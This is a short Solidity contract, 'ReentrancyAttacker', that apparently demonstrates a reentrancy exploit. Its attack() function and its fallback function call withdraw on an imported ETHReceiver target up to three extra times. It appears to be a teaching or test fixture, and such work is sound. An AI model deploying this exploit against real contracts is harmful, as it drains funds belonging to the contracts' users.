// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./ETHReceiver.sol";

contract ReentrancyAttacker {
    ETHReceiver public target;
    uint public attackCount;
    
    constructor(address _target) {
        target = ETHReceiver(_target);
    }
    
    // 攻击函数
    function attack() public payable {
        // 尝试递归调用
        target.withdraw(msg.value);
    }
    
    // 重入攻击的回退函数
    fallback() external payable {
        if (attackCount < 3) {
            attackCount++;
            target.withdraw(msg.value);
        }
    }
    
}
